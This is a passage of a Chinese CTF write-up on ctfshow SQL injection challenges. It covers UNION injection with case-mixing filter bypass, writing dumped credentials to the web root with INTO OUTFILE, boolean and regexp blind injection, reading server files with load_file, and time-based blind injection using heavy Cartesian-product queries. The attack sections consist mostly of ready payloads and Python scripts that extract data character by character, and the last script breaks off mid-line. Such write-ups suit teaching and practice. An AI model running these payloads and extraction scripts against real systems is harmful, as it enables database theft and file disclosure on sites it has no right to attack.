+<p><img src="https://img-blog.csdnimg.cn/a0553e0b53554bdd912bf9ef02a2130a.png" alt="在这里插入图片描述"><br>报错，我一开始想的是字母和数字可能被过滤了，但我想到order by查询时没有报错，这说明应该是过滤了某个固定字符，尝试大小写绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; uNion sElect 1,group_concat(username),group_concat(password) from ctfshow_user --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/7344160f496f4e95bdf618f100b8f75b.png" alt="在这里插入图片描述"></p>
+<h3><span id="0x03">0X03</span></h3><p>返回逻辑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, json_encode($ret)))&#123;</span><br><span class="line">  $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>知识科普</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\xnn 匹配ASCII代码中十六进制代码为nn的字符</span><br><span class="line"><span class="attribute">0x00</span>==0</span><br><span class="line"><span class="attribute">0x7f</span>==127</span><br></pre></td></tr></table></figure>
+<p>针对本关的话，我们可以采用写入文件来进行绕过从而获取flag，我们知道文件网页上回显出的文件一般位于<code>/var/www/html</code>下，因此我们可构造payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select username,password from ctfshow_user5 into outfile </span></span><br><span class="line"><span class="string">&#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>quan.txt<span class="string">&#x27;--+ </span></span><br></pre></td></tr></table></figure>
+<p>此时我们再去访问quan.txt<br><img src="https://img-blog.csdnimg.cn/790301662c5b4ba188347d1c48334a89.png" alt="在这里插入图片描述"></p>
+<h2><span id="布尔盲注">布尔盲注</span></h2><h3><span id="0x01">0X01</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>密码检测</span><br><span class="line">  if(<span class="operator">!</span>is_numeric($password))&#123;</span><br><span class="line">    $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    die(json_encode($ret));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="operator">/</span><span class="operator">/</span>密码判断</span><br><span class="line">  if($<span class="type">row</span>[<span class="string">&#x27;pass&#x27;</span>]<span class="operator">=</span><span class="operator">=</span>$password)&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="operator">/</span><span class="operator">/</span>TODO:感觉少了个啥，奇怪</span><br><span class="line">    if(preg_match(<span class="string">&#x27;/file|into|ascii/i&#x27;</span>, $username))&#123;</span><br><span class="line">        $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">        die(json_encode($ret));</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
+<p>本关过滤了ascii，但ord函数在处理单字符时与ascii效果相同，因此我们这里替换一下即可<br>利用的基本原理是布尔盲注，在界面中测试的话payload就是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: <span class="number">-1</span><span class="string">&#x27; or if(substr((select group_concat(f1ag) from ctfshow_fl0g),1,1)=&#x27;</span>c<span class="string">&#x27;,1,0)#</span></span><br><span class="line"><span class="string">password: 1</span></span><br></pre></td></tr></table></figure>
+<p>此时回显密码错误，那就说明用户语句执行正确，说明注入成功，此时响应为<code>&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u5bc6\u7801\u9519\u8bef&quot;,&quot;count&quot;:0,&quot;data&quot;:[]&#125;</code>，可以根据<code>\u5bc6\u7801\u9519\u8bef</code>来进行判断username是否执行正确也就得到了首字母，但由于这样测试太慢，我们可以利用python脚本来进行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#@Author:quan9i</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f9eb9d85-b9e7-4719-8ab3-a1aecfd29198.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">55</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz_-&#123;&#125;&quot;</span>:</span><br><span class="line">            <span class="comment">#查数据库</span></span><br><span class="line">            <span class="comment"># payload=&quot;-1&#x27; or if(substr((select database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,1,0)#&quot;.format(i,j)</span></span><br><span class="line">            <span class="comment">#查表</span></span><br><span class="line">            <span class="comment"># payload=&quot;-1&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,1,0)#&quot;.format(i,j)</span></span><br><span class="line">            <span class="comment">#查列</span></span><br><span class="line">            <span class="comment"># payload=&quot;-1&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,1,0)#&quot;.format(i,j)</span></span><br><span class="line">            <span class="comment">#查字段</span></span><br><span class="line">            payload=<span class="string">&quot;-1&#x27; or if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,1,0)#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>:<span class="number">0</span></span><br><span class="line">            &#125;</span><br><span class="line">            r=requests.post(url=url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag += j</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                    exit()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure>
+<h3><span id="0x02">0X02</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  //拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = <span class="string">&quot;select pass from ctfshow_user where username = &#123;$username&#125;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">返回逻辑</span><br><span class="line">  //用户名检测</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;</span>, $username))&#123;</span><br><span class="line">    $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    die(json_encode($ret));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //密码检测</span><br><span class="line">  <span class="keyword">if</span>(!is_numeric($password))&#123;</span><br><span class="line">    $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    die(json_encode($ret));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //密码判断</span><br><span class="line">  <span class="keyword">if</span>($row[<span class="string">&#x27;pass&#x27;</span>]==$password)&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>看密码判断，<code>$row[&#39;pass&#39;]</code>可以理解为返回查询的结果，在和后面的password进行弱比较，这里我需要简单介绍一下<code>intval</code>函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intval():当里面内容为数字时候，输出的是数字</span><br><span class="line">         当内容为字母时，输出的是<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>此时我们构造username=<code>0</code>，因为username中都是字符串，其数字值也是0，所以返回了所有以字母开头的数据，同理如果pass中的数据也都是字母开头，此时我们再让password等于0，条件就可以成功执行，flag也会回显出来。<br>这里我们尝试0/0进行登录<br><img src="https://img-blog.csdnimg.cn/1b5699aaaef04603b1e0d6dba02af600.png" alt="在这里插入图片描述"><br>提示密码错误，说明存在全字母的username，但password不是全字母。<br>此时查看响应<br><img src="https://img-blog.csdnimg.cn/6496610727ad4d26bbad5b92a3a42882.png" alt="在这里插入图片描述"><br>尝试1/0登录<img src="https://img-blog.csdnimg.cn/a899db0033c94e77b44e083152fc955d.png" alt="在这里插入图片描述"><br>提示查询失败，说明不存在username为1的用户，此时查看响应<br><img src="https://img-blog.csdnimg.cn/729147c6c0cc428bb44aa793513cef86.png" alt="在这里插入图片描述"><br>综合来看，说明当username正确执行时，会出现<code>\u5bc6\u7801\u9519\u8bef</code>字段，<br>由题目提示可知文件路径在<code>/var/www/html/api/index.php</code>下，因此我们可以利用<code>load_file</code>函数来获取内容，在这里对load_file简单介绍一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_file():将括号内的文件内容进行读取，并以字符串形式返回</span><br></pre></td></tr></table></figure>
+<p>用if语句将文件内容读取并进行正则匹配，正确执行时输出0，否则为1。此时username如果执行正确就可以查到数据，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#@Author:quan9i</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://044bf66a-c828-4484-8281-4668e93c34ea.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">chr</span>(j)!=<span class="string">&#x27;?&#x27;</span><span class="keyword">and</span> <span class="built_in">chr</span>(j)!=<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">            payload=<span class="string">&quot;if((load_file(&#x27;/var/www/html/api/index.php&#x27;))regexp(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="built_in">format</span>(flag+<span class="built_in">chr</span>(j))</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>:<span class="number">0</span> <span class="comment">#这里可以随便输入，这种方式获取flag不需要看password</span></span><br><span class="line">            &#125;</span><br><span class="line">            r=requests.post(url=url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(j)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                    exit()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;成功绕过元字符&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/be0aa49858af4192ae79e6094a70467d.png" alt="在这里插入图片描述"><br><font color="red">注:这里j不能取<code>+</code> <code>?</code> <code>.</code> 是因为这三个属于正则表达式中的元字符，会污染正则匹配，还有ascii码的(0,32)及127是控制字符，也会影响脚本</font></p>
+<h3><span id="0x03布尔盲注正则版">0X03（布尔盲注正则版）</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>拼接<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">  $<span class="keyword">sql</span> <span class="operator">=</span> &quot;select count(pass) from &quot;.$_POST[<span class="string">&#x27;tableName&#x27;</span>].&quot;;&quot;;</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>对传入的参数进行了过滤</span><br><span class="line">  <span class="keyword">function</span> waf($str)&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, $str);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">查询结果</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>返回用户表的记录总数</span><br><span class="line">      $user_count <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
+<p>可以看出注入方式改为post注入，我们查看sql语句可以发现我们只需要以post方式传入表名即可正确执行sql语句，简单测试一下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName<span class="operator">=</span>ctfshow_user</span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/4b3fb815a92e42159c7eb76594d1330a.png" alt="在这里插入图片描述">发现可以执行，此时我们可以利用where进行模糊匹配，从而得到我们想要的flag<br>payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName<span class="operator">=</span>`ctfshow_user`<span class="keyword">where</span>(substr(`pass`,<span class="number">1</span>,<span class="number">1</span>)regexp(<span class="string">&#x27;c&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>执行的实际语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(pass) <span class="keyword">from</span> &quot;tableName=`ctfshow_user`where(substr(`pass`,1,1)regexp(&#x27;c&#x27;))&quot;;</span><br></pre></td></tr></table></figure>
+<p>涉及知识</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">substr(x,y,z)</span><br><span class="line">x是字符串那部分，我们在这里可以理解为列名</span><br><span class="line">y指的是从y开始，例如当y<span class="operator">=</span><span class="number">1</span>是就从第一个字母开始</span><br><span class="line">z指的是截取几位，例如当z<span class="operator">=</span><span class="number">1</span>时就代表截取<span class="number">1</span>位</span><br><span class="line"></span><br><span class="line">regexp模糊匹配</span><br><span class="line">在这里表示的是将结果</span><br></pre></td></tr></table></figure>
+
+<p>本地测试一下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> substr(`username`,<span class="number">1</span>,<span class="number">1</span>)regexp(<span class="string">&#x27;a&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/9ecedccc793048ffa47057e5c9e726d7.png" alt="在这里插入图片描述">可见其可以把username列中首字母为a的全部取出来</p>
+<p>你可以把第一个1依次后推，在bp中，设置c为变量进行爆破，可以依次得到flag<br>不过这样速度较慢，搞一下脚本</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url<span class="operator">=</span><span class="string">&#x27;http://6b306aef-1841-4432-8af3-599dd5db1815.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flagstr<span class="operator">=</span>r&quot;1234567890qwertyuiopasdfghjklzxcvbnm-_&#125;&#123;&quot;</span><br><span class="line">flag<span class="operator">=</span><span class="string">&#x27;ctfhsow&#x27;</span> <span class="operator">/</span><span class="operator">/</span>设置flag格式，再进行匹配更精确</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">8</span>,<span class="number">50</span>): <span class="operator">/</span><span class="operator">/</span>ctfshow已经<span class="number">7</span>位，故从第八位开始</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data <span class="operator">=</span> &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: &quot;(ctfshow_user)where(substr(pass,&#123;&#125;,1))regexp(&#x27;&#123;&#125;&#x27;)&quot;.format(str(i),j) <span class="operator">/</span><span class="operator">/</span>第一次的时候就是在全部列的pass下第八位中依次寻找j的，最终取出来，这里取出&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        exp <span class="operator">=</span> requests.post(url, data<span class="operator">=</span>data)</span><br><span class="line">        if &quot;$user_count = 1;&quot; <span class="keyword">in</span> exp.text:</span><br><span class="line">            flag <span class="operator">+</span><span class="operator">=</span> j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<h2><span id="时间盲注">时间盲注</span></h2><h3><span id="0x01时间盲注笛卡尔积版">0X01(时间盲注笛卡尔积版)</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> waf($str)&#123;</span><br><span class="line">       <span class="keyword">return</span> preg_match(<span class="string">&#x27;/sleep|benchmark/i&#x27;</span>,$str);</span><br><span class="line">   &#125;   </span><br></pre></td></tr></table></figure>
+<p>过滤这两个函数，有一种东西叫笛卡尔积，简单介绍一下<br><code>笛卡尔积，又叫cross join，是SQL中两表连接的一种方式。通常我们都要在实际SQL中避免直接使用笛卡尔积，因为它会使“数据爆炸”，尤其是数据量很大的时候。</code>本地测试如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables D;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/0fe00a81884b4542bbce3bd65c108868.png" alt="在这里插入图片描述">由此可见可以代替被ban的函数，因此我们可以构造payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)，<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>,(<span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>但由于手动较慢，因此选用脚本，脚本如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#<span class="variable">@Author</span>:quan9i</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> &quot;http://d0565861-1643-4f0f-8ef3-10c53ce54e13.challenge.ctf.show/api/&quot;</span><br><span class="line">flag<span class="operator">=</span>&quot;ctfshow&#123;&quot;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">9</span>,<span class="number">55</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> &quot;0123456789ab,cdefghijklmnopqrstuvwxyz_-&#123;&#125;&quot;:</span><br><span class="line">            #查表</span><br><span class="line">            #payload<span class="operator">=</span>&quot;if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)&quot;</span><br><span class="line">            #查字段</span><br><span class="line">            payload<span class="operator">=</span>&quot;if(substr((select flagaac from ctfshow_flagxc),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables D),1)&quot;</span><br><span class="line">            #print(payload)</span><br><span class="line">            data<span class="operator">=</span>&#123;</span><br><span class="line">                <span class="string">&#x27;ip&#x27;</span>:payload.format(i,j),</span><br><span class="line">                <span class="string">&#x27;debug&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            print(data)</span><br><span class="line">            try:</span><br><span class="line">                response <span class="operator">=</span> requests.post(url<span class="operator">=</span>url,data<span class="operator">=</span>data,timeout<span class="operator">=</span><span class="number">0.7</span>)</span><br><span class="line">                #print(&quot;执行失败&quot;)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                #print(&quot;执行成功&quot;)</span><br><span class="line">                flag <span class="operator">+</span><span class="operator">=</span> j</span><br><span class="line">                print(flag)  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3><span id="0x02">0X02</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>分页查询</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctfshow_user <span class="keyword">group</span> <span class="keyword">by</span> $username;</span><br></pre></td></tr></table></figure>
+<p>看起来是group by注入，在查询了有关group by注入后发现，大部分都是group by报错注入，这位师傅的文章写的还是很不错的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html">https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html</a>，当我p颠p颠的去注入报错注入的payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(database(),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))</span><br></pre></td></tr></table></figure>
+<p>发现没反应，此时才想到压根就没回显，又怎么可能有报错信息，因此我们这里只能用时间盲注来进行获取flag，示例payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(if(substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),&#123;<span class="number">1</span>&#125;,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;&#123;c&#125;&#x27;</span>,sleep(<span class="number">1</span>),<span class="number">0</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>脚本如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#<span class="variable">@Author</span>:quan9i</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> &quot;http://62e82e3d-ef80-4818-86f3-50e23a409d63.challenge.ctf.show/api/&quot;</span><br><span class="line">flag<span class="operator">=</span>&quot;ctfshow&#123;&quot;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">9</span>,<span class="number">55</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> &quot;0123456789ab,cdefghijklmnopqrstuvwxyz_-&#123;&#125;&quot;:</span><br><span class="line">            #查数据库</span><br><span class="line">            #payload<span class="operator">=</span>&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br><span class="line">            #print(payload)</span><br><span class="line">            #查表</span><br><span class="line">            #payload<span class="operator">=</span>&quot;select group_concat(table_name) from information_schema.tables where table_schema=database())&quot;</span><br><span class="line">            #print(payload)</span><br><span class="line">            #查列                                                                                                                                                                                                                                                                                 </span><br><span class="line">            #payload<span class="operator">=</span>&quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;&quot;</span><br><span class="line">            #print(payload)</span><br><span class="line">            #查字段</span><br><span class="line">            payload<span class="operator">=</span>&quot;select flagaabc from ctfshow_flaga&quot;</span><br><span class="line">            #print(payload)</span><br><span class="line">            params<span class="operator">=</span>&#123;</span><br><span class="line">                <span 